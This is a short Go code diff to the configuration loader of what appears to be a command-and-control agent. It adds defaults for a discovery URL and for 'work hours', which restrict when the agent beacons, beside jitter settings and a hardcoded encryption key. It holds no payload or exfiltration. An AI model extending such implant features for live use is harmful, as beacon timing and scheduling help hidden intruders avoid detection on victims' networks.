@@ -40,6 +40,10 @@ type WorkHours struct {
 var DefaultBeaconMin = "30"
 var DefaultBeaconMax = "60"
 var DefaultEncryptionKey = "bytecode-c2-project-secret-key!!"
+var DefaultDiscoveryURL = ""
+var DefaultWorkHoursEnabled = "false"
+var DefaultWorkHoursStart = "9"
+var DefaultWorkHoursEnd = "17"
 
 // Load returns the agent configuration
 func Load() *Config {
@@ -65,6 +69,14 @@ func Load() *Config {
 	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
 	fmt.Sscanf(DefaultBeaconMax, "%d", &max)
 
+	var wStart, wEnd int
+	fmt.Sscanf(DefaultWorkHoursStart, "%d", &wStart)
+	fmt.Sscanf(DefaultWorkHoursEnd, "%d", &wEnd)
+
+	if discoveryURL == "" {
+		discoveryURL = DefaultDiscoveryURL
+	}
+
 	cfg := &Config{
 		ServerURLs:    urls,
 		CurrentURLIdx: 0,
@@ -76,7 +88,9 @@ func Load() *Config {
 		EncryptionKey: []byte(DefaultEncryptionKey),
 		Jitter:        25,
 		WorkHours: WorkHours{
-			Enabled: false,
+			Enabled: DefaultWorkHoursEnabled == "true",
+			Start:   wStart,
+			End:     wEnd,
 		},
 	}
 
